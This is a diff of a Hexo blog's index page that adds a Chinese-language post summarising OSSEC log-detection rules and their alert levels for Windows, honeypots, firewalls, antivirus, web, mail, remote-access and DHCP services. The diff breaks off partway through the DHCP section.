@@ -6,17 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hexo</title>
+  <title>readers</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+  <meta name="description" content="The backyard of readers and programmers">
+<meta property="og:type" content="website">
+<meta property="og:title" content="readers">
 <meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="og:site_name" content="readers">
+<meta property="og:description" content="The backyard of readers and programmers">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="anonymous">
+<meta property="article:tag" content="readers">
 <meta name="twitter:card" content="summary">
   
-    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="readers" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
@@ -55,7 +58,9 @@
 			
 				<li><a href="/">主页</a></li>
 	        
-				<li><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+				<li><a href="/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">常用命令</a></li>
+	        
+				<li><a href="/2024/07/26/%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA">网址导航</a></li>
 	        
 				<li><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 	        
@@ -117,6 +122,8 @@
 			
 				
 			
+				
+			
 			
 			
 			<nav class="header-nav">
@@ -137,11 +144,13 @@
 				<ul style="width: 70%">
 				
 				
-					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
+					<li style="width: 25%"><a href="/">主页</a></li>
 		        
-					<li style="width: 33.333333333333336%"><a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">随笔</a></li>
+					<li style="width: 25%"><a href="/2024/07/26/kali-linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">常用命令</a></li>
 		        
-					<li style="width: 33.333333333333336%"><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
+					<li style="width: 25%"><a href="/2024/07/26/%E7%BD%91%E5%9D%80%E5%AF%BC%E8%88%AA">网址导航</a></li>
+		        
+					<li style="width: 25%"><a href="/tags/DC%E7%B3%BB%E5%88%97%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">靶机攻略</a></li>
 		        
 				</ul>
 			</nav>
@@ -157,6 +166,870 @@
           </div>
           <div id="js-content" class="content-ll">
             
+  
+    <article id="post-ossec规则整理" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/08/02/ossec%E8%A7%84%E5%88%99%E6%95%B4%E7%90%86/">ossec规则整理</a>
+    </h1>
+  
+
+        
+        <a href="/2024/08/02/ossec%E8%A7%84%E5%88%99%E6%95%B4%E7%90%86/" class="archive-article-date">
+  	<time datetime="2024-08-02T03:04:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-08-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA%E6%B1%87%E6%80%BB">检测行为汇总</a></li>
+<li><a href="#windows">windows</a><ul>
+<li><a href="#windowsfirewall">windows,firewall</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#%E6%97%A5%E5%BF%97">日志</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-1">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#sysmon_process-anomalies">sysmon_process-anomalies</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-2">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E8%9C%9C%E7%BD%90">蜜罐</a><ul>
+<li><a href="#cowrie">cowrie</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-1">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-3">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#dionaea">dionaea</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-2">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-4">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-5">检测行为</a></li>
+<li><a href="#netscreenfw">netscreenfw</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-3">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-6">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#sonicwall">sonicwall</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-4">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-7">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B">病毒检测</a><ul>
+<li><a href="#mcafee">mcafee</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-5">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-8">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#microsoft-security-essentials">Microsoft Security Essentials</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-6">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-9">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#symantec">symantec</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-7">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-10">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#clamdfreshclam">clamd,freshclam</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-8">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-11">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#web">web</a><ul>
+<li><a href="#nginx">nginx</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-9">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-12">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#squid">squid</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-10">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-13">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#apache">apache</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-11">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA%E7%AE%80%E4%BB%8B">检测行为简介</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#mail">mail</a><ul>
+<li><a href="#exim">exim</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-12">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-14">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#hordeimp">hordeimp</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-13">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-15">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#mailscanner">mailscanner</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-14">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-16">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#exchange">exchange</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-15">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-17">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#vm-pop3d">vm-pop3d</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-16">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-18">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#vpopmail">vpopmail</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-17">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-19">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#dovecot">dovecot</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-18">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-20">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#courier">courier</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-19">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-21">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6">访问控制</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5">远程连接</a><ul>
+<li><a href="#dropbear">dropbear</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-20">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-22">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#ftpd">ftpd</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-21">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-23">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#msftp">msftp</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-22">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-24">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#sshd">sshd</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-23">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-25">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#telnetd">telnetd</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-24">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-26">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#vsftpd">vsftpd</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-25">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-27">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#arp">ARP</a><ul>
+<li><a href="#dhcp">dhcp</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-26">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-28">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#ipsec">ipsec</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-27">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-29">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#named">named</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-28">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-30">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#dhcpd">dhcpd</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-31">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#unbound">unbound</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-29">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-32">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#arpwatch">arpwatch</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-30">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-33">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#other">other</a><ul>
+<li><a href="#usb">usb</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-34">检测行为</a></li>
+<li><a href="#mysql">mysql</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-35">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#syslog">syslog</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-36">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#vmware">vmware</a><ul>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-37">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#cisco_ios">cisco_ios</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-31">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-38">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#attacks">attacks</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-32">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-39">检测行为</a></li>
+</ul>
+</li>
+<li><a href="#asterisk">asterisk</a><ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D-33">介绍</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B%E8%A1%8C%E4%B8%BA-40">检测行为</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="检测行为汇总"><a href="#检测行为汇总" class="headerlink" title="检测行为汇总"></a>检测行为汇总</h1><p>所有检测依赖于日志</p>
+<ol>
+<li>各种需要账号密码服务的暴力破解行为。</li>
+<li>web 可疑访问行为（400，500，501），XSS，sql注入。</li>
+<li>异常size日志。</li>
+<li>已知安全组件，多条警告错误信息等级提升。</li>
+<li>防火请多次拦截相同ip请求。</li>
+<li>用户信息发生变化（新增，删除，权限变更）。</li>
+<li>堆栈溢出。</li>
+<li>磁盘空间满，DNS池满，USB新设备。</li>
+</ol>
+<h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="windows-firewall"><a href="#windows-firewall" class="headerlink" title="windows,firewall"></a>windows,firewall</h2><h3 id="检测行为"><a href="#检测行为" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>防火墙没有工作。</li>
+<li>防火墙规则发生变化。</li>
+</ol>
+<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="检测行为-1"><a href="#检测行为-1" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>新建用户（组），修改账户（组），删除账户（组）（level 8）</li>
+<li>审计策略改变（level 8）</li>
+<li>用户账号锁定，多次登陆失败尝试（level 9）</li>
+<li>审计日志被清除（level 9）</li>
+<li>windows文件系统满了（level 8）</li>
+<li>用户权限发生变化SID，添加SID用户（level 12）</li>
+</ol>
+<h2 id="sysmon-process-anomalies"><a href="#sysmon-process-anomalies" class="headerlink" title="sysmon_process-anomalies"></a>sysmon_process-anomalies</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Sysmon 是 Windows Sysinternals 套件中的一个工具，用于记录系统活动和进程信息</p>
+<h3 id="检测行为-2"><a href="#检测行为-2" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>检测到可疑进程lsm.exe，存在父进程（level 12）</li>
+<li>explorer.exe，dllhost.exe，services.exe，taskhost.exe，smss.exe，wininit.exe行为异常（level 12）</li>
+</ol>
+<h1 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h1><h2 id="cowrie"><a href="#cowrie" class="headerlink" title="cowrie"></a>cowrie</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>开源蜜罐软件</p>
+<h3 id="检测行为-3"><a href="#检测行为-3" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>蜜罐检测出禁止端口访问，禁止命令尝试（level 8）</li>
+</ol>
+<h2 id="dionaea"><a href="#dionaea" class="headerlink" title="dionaea"></a>dionaea</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>开源的蜜罐（honeypot）软件</p>
+<h3 id="检测行为-4"><a href="#检测行为-4" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>蜜罐检测（level 8）</li>
+</ol>
+<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><h2 id="检测行为-5"><a href="#检测行为-5" class="headerlink" title="检测行为"></a>检测行为</h2><ol>
+<li>多次drop相同ip信息（level 10）</li>
+</ol>
+<h2 id="netscreenfw"><a href="#netscreenfw" class="headerlink" title="netscreenfw"></a>netscreenfw</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>Juniper Networks 提供的一款网络防火墙产品</p>
+<h3 id="检测行为-6"><a href="#检测行为-6" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>防火墙策略变化，admin登陆（level 8）</li>
+<li>发生多个防火墙关键事件，警报事件（level 10）</li>
+</ol>
+<h2 id="sonicwall"><a href="#sonicwall" class="headerlink" title="sonicwall"></a>sonicwall</h2><p>SonicWall是一家专注于网络安全解决方案的公司，</p>
+<h3 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h3><ol>
+<li>防火墙认证失败（level 9）</li>
+<li>多条防火墙错误信息，警报信息（level 10）</li>
+</ol>
+<h3 id="检测行为-7"><a href="#检测行为-7" class="headerlink" title="检测行为"></a>检测行为</h3><h1 id="病毒检测"><a href="#病毒检测" class="headerlink" title="病毒检测"></a>病毒检测</h1><h2 id="mcafee"><a href="#mcafee" class="headerlink" title="mcafee"></a>mcafee</h2><h3 id="介绍-5"><a href="#介绍-5" class="headerlink" title="介绍"></a>介绍</h3><p>全球知名的网络安全公司</p>
+<h3 id="检测行为-8"><a href="#检测行为-8" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>发现病毒日志（level 12）</li>
+<li>发现多条警报信息（level 10）</li>
+</ol>
+<h2 id="Microsoft-Security-Essentials"><a href="#Microsoft-Security-Essentials" class="headerlink" title="Microsoft Security Essentials"></a>Microsoft Security Essentials</h2><h3 id="介绍-6"><a href="#介绍-6" class="headerlink" title="介绍"></a>介绍</h3><p>微软公司开发的一款安全软件，主要用来提供基本的端点病毒防护服务。</p>
+<h3 id="检测行为-9"><a href="#检测行为-9" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>检测到病毒，但是无法移除（level 12）</li>
+<li>服务启动失败，实时保护失败（level 9）</li>
+<li>检测到多条警报消息（level 10）</li>
+</ol>
+<h2 id="symantec"><a href="#symantec" class="headerlink" title="symantec"></a>symantec</h2><h3 id="介绍-7"><a href="#介绍-7" class="headerlink" title="介绍"></a>介绍</h3><p>美国的全球领先的信息安全公司</p>
+<h3 id="检测行为-10"><a href="#检测行为-10" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>发现病毒（level 9）</li>
+</ol>
+<h2 id="clamd-freshclam"><a href="#clamd-freshclam" class="headerlink" title="clamd,freshclam"></a>clamd,freshclam</h2><h3 id="介绍-8"><a href="#介绍-8" class="headerlink" title="介绍"></a>介绍</h3><p>ClamAV 防病毒软件套件中的两个关键组件</p>
+<h3 id="检测行为-11"><a href="#检测行为-11" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>发现病毒（level 8）</li>
+<li>软件出现错误日志（level 10）</li>
+</ol>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><h3 id="介绍-9"><a href="#介绍-9" class="headerlink" title="介绍"></a>介绍</h3><p>开源 web 服务器和反向代理服务器</p>
+<h3 id="检测行为-12"><a href="#检测行为-12" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次登陆失败（level 10）</li>
+<li>无效URL，文件名过长（level 10）</li>
+</ol>
+<h2 id="squid"><a href="#squid" class="headerlink" title="squid"></a>squid</h2><h3 id="介绍-10"><a href="#介绍-10" class="headerlink" title="介绍"></a>介绍</h3><p>开源代理缓存服务器软件</p>
+<h3 id="检测行为-13"><a href="#检测行为-13" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次访问禁止文件（level 10）</li>
+<li>多次失败使用代理尝试（level 10）</li>
+<li>多次错误请求，无效请求（level 10）</li>
+<li>多次Attempt to access a Beagle worm (or variant)（level 12）</li>
+<li>多次访问不存在的文件（level 10）</li>
+<li>相同ip多个400，500，600错误码（level 10）</li>
+</ol>
+<h2 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h2><h3 id="介绍-11"><a href="#介绍-11" class="headerlink" title="介绍"></a>介绍</h3><p>一个开源的 Web 服务器软件</p>
+<h3 id="检测行为简介"><a href="#检测行为简介" class="headerlink" title="检测行为简介"></a>检测行为简介</h3><ol>
+<li>段错误（level 12）</li>
+<li>用户名错误（level 9）</li>
+<li>同源多次无效url请求（level 10）</li>
+<li>url文件名太长（level 10）</li>
+<li>同源多次访问禁止访问内容（level 12）</li>
+</ol>
+<h1 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h1><h2 id="exim"><a href="#exim" class="headerlink" title="exim"></a>exim</h2><h3 id="介绍-12"><a href="#介绍-12" class="headerlink" title="介绍"></a>介绍</h3><p>开源邮件传输代理（MTA）</p>
+<h3 id="检测行为-14"><a href="#检测行为-14" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次失败登陆（level 10）</li>
+</ol>
+<h2 id="hordeimp"><a href="#hordeimp" class="headerlink" title="hordeimp"></a>hordeimp</h2><h3 id="介绍-13"><a href="#介绍-13" class="headerlink" title="介绍"></a>介绍</h3><p>基于 Web 的电子邮件客户端</p>
+<h3 id="检测行为-15"><a href="#检测行为-15" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>客户端多个紧急日志信息（level 10）</li>
+<li>相同ip多次失败登陆尝试（level 10）</li>
+</ol>
+<h2 id="mailscanner"><a href="#mailscanner" class="headerlink" title="mailscanner"></a>mailscanner</h2><h3 id="介绍-14"><a href="#介绍-14" class="headerlink" title="介绍"></a>介绍</h3><p>开源的电子邮件过滤和安全解决方案</p>
+<h3 id="检测行为-16"><a href="#检测行为-16" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>检测到多个垃圾邮件（level 6）</li>
+</ol>
+<h2 id="exchange"><a href="#exchange" class="headerlink" title="exchange"></a>exchange</h2><h3 id="介绍-15"><a href="#介绍-15" class="headerlink" title="介绍"></a>介绍</h3><p>微软开发的一套企业级电子邮件服务器解决方案</p>
+<h3 id="检测行为-17"><a href="#检测行为-17" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>发送邮件给多个无效用户（level 9）</li>
+<li>检测到多个垃圾邮件，邮件错误码（level 9）</li>
+</ol>
+<h2 id="vm-pop3d"><a href="#vm-pop3d" class="headerlink" title="vm-pop3d"></a>vm-pop3d</h2><h3 id="介绍-16"><a href="#介绍-16" class="headerlink" title="介绍"></a>介绍</h3><p>vm-pop3d 是一个开源的 POP3 邮件服务器守护进程</p>
+<h3 id="检测行为-18"><a href="#检测行为-18" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次错误登陆尝试（level 10）</li>
+</ol>
+<h2 id="vpopmail"><a href="#vpopmail" class="headerlink" title="vpopmail"></a>vpopmail</h2><h3 id="介绍-17"><a href="#介绍-17" class="headerlink" title="介绍"></a>介绍</h3><p>开源的邮件服务器管理工具</p>
+<h3 id="检测行为-19"><a href="#检测行为-19" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多条错误登陆请求（level 10）</li>
+</ol>
+<h2 id="dovecot"><a href="#dovecot" class="headerlink" title="dovecot"></a>dovecot</h2><h3 id="介绍-18"><a href="#介绍-18" class="headerlink" title="介绍"></a>介绍</h3><p>开源的 IMAP 和 POP3 邮件服务器</p>
+<h3 id="检测行为-20"><a href="#检测行为-20" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>相同ip多次密码错误，多次无效用户（level 10）</li>
+</ol>
+<h2 id="courier"><a href="#courier" class="headerlink" title="courier"></a>courier</h2><h3 id="介绍-19"><a href="#介绍-19" class="headerlink" title="介绍"></a>介绍</h3><p>开源邮件服务器套件</p>
+<h3 id="检测行为-21"><a href="#检测行为-21" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次失败登陆（level 10）</li>
+<li>相同ip多次失败连接（level 10）</li>
+</ol>
+<h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h1 id="远程连接"><a href="#远程连接" class="headerlink" title="远程连接"></a>远程连接</h1><h2 id="dropbear"><a href="#dropbear" class="headerlink" title="dropbear"></a>dropbear</h2><h3 id="介绍-20"><a href="#介绍-20" class="headerlink" title="介绍"></a>介绍</h3><p>轻量级的 SSH 服务器和客户端实现</p>
+<h3 id="检测行为-22"><a href="#检测行为-22" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次ssh登陆失败（level 10）</li>
+</ol>
+<h2 id="ftpd"><a href="#ftpd" class="headerlink" title="ftpd"></a>ftpd</h2><h3 id="介绍-21"><a href="#介绍-21" class="headerlink" title="介绍"></a>介绍</h3><p>处理 FTP（文件传输协议）请求的服务器软件</p>
+<h3 id="检测行为-23"><a href="#检测行为-23" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多次失败登陆尝试（level 10）</li>
+<li>尝试以禁止用户登陆（level 9）</li>
+</ol>
+<h2 id="msftp"><a href="#msftp" class="headerlink" title="msftp"></a>msftp</h2><h3 id="介绍-22"><a href="#介绍-22" class="headerlink" title="介绍"></a>介绍</h3><p>是一种基于 FTP（文件传输协议）的安全文件传输解决方案。与传统的 FTP 不同，MSFTP 通过加密技术提升了数据传输的安全性。</p>
+<h3 id="检测行为-24"><a href="#检测行为-24" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>相同ip多次连接尝试，多次认证失败（level 10）</li>
+</ol>
+<h2 id="sshd"><a href="#sshd" class="headerlink" title="sshd"></a>sshd</h2><h3 id="介绍-23"><a href="#介绍-23" class="headerlink" title="介绍"></a>介绍</h3><p>SSHD（Secure Shell Daemon）是一个实现 SSH（Secure Shell）协议的服务程序，</p>
+<h3 id="检测行为-25"><a href="#检测行为-25" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>不同版本ssh连接请求（level 8）</li>
+<li>多次DNS反向查找错误（level 10）</li>
+<li>多次ssh超时连接（level 10）</li>
+<li>在处理数据时出现了错误，特别是处理字符串或缓冲区数据时出现了问题。（level 14）</li>
+<li>多次无效用户登陆（level 10）</li>
+<li>多次损坏日志请求（level 14）</li>
+<li>多次无效用户连接请求（level 10）</li>
+</ol>
+<h2 id="telnetd"><a href="#telnetd" class="headerlink" title="telnetd"></a>telnetd</h2><h3 id="介绍-24"><a href="#介绍-24" class="headerlink" title="介绍"></a>介绍</h3><p>Telnet 服务的守护进程（daemon），用于在网络上提供远程终端访问。</p>
+<h3 id="检测行为-26"><a href="#检测行为-26" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>相同ip多次连接请求（level 10）</li>
+</ol>
+<h2 id="vsftpd"><a href="#vsftpd" class="headerlink" title="vsftpd"></a>vsftpd</h2><h3 id="介绍-25"><a href="#介绍-25" class="headerlink" title="介绍"></a>介绍</h3><p>高性能的、注重安全性的 FTP 服务器软件</p>
+<h3 id="检测行为-27"><a href="#检测行为-27" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>多条错误连接请求（level 10）</li>
+</ol>
+<h1 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h1><h2 id="dhcp"><a href="#dhcp" class="headerlink" title="dhcp"></a>dhcp</h2><h3 id="介绍-26"><a href="#介绍-26" class="headerlink" title="介绍"></a>介绍</h3><p>动态主机配置协议，自动分配 IP 地址</p>
+<h3 id="检测行为-28"><a href="#检测行为-28" class="headerlink" title="检测行为"></a>检测行为</h3><ol>
+<li>日志由于磁盘空间不足而暂停（level 10）</li>
+<li>IP池耗尽（level 12）</li>
+<li>不符合 NAP 策略的数据包被丢弃（level 12）</li>
+<li>检测到一个潜在的流氓 DHCP 服务器（level 12）</li>
+<li>审计日志记录功能被暂停（level 10）</li>
